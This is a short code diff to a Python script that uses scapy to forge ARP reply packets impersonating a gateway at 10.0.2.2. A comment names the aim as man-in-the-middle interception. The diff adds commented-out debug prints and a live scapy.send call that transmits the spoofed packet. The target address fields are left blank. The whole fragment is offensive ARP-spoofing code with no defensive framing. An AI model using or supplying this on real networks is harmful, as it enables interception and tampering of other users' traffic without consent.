@@ -8,3 +8,10 @@ import scapy.all as scapy
 # scapy.ARP(srdst) = router gateway IP, we are MitM'ing
 
 packet = scapy.ARP(op=2, pdst='', hwdst='',psrc='10.0.2.2' )
+# show = (packet.show())
+# summary = (packet.summar())
+
+# print(show)
+# print(summary)
+
+scapy.send(packet)
